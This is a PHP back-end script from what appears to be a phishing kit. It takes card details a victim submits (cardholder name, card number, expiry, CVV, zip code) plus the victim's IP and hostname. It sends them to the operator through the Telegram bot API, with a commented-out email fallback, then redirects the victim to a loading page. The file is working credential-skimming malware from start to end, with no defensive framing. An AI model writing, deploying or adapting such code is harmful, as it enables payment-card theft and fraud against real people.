<?php

$chat_id = "";
$token = "";


function send_message_to_telegram($chat_id, $message, $token) {
	$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id;
	$url = $url . "&text=" . urlencode($message);
	$ch = curl_init();
	$optArray = array(
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => true
	);
	curl_setopt_array($ch, $optArray);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________HisHow0KiNg_____________\n";
$message .= "CC Holder's        : ".$_POST['cardholder']."\n";
$message .= "CC Number         : ".$_POST['cardnumber']."\n";
$message .= "expiry-Month          : ".$_POST['expiryMonth']."\n";
$message .= "expiry-Year           : ".$_POST['expiryYear']."\n";
$message .= "CCV                  : ".$_POST['csc']."\n";
$message .= "Zip Code             : ".$_POST['zip-code']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| l7way  |__________\n";
$sift = "";
$subject = "New CC fr0m | $ip ";
$headers = "From: Lulz <ana@@network.pickup.fr>";
//mail($sift,$subject,$message,$headers);
send_message_to_telegram($chat_id, $message, $token);
header("Location: loading.php");

?>
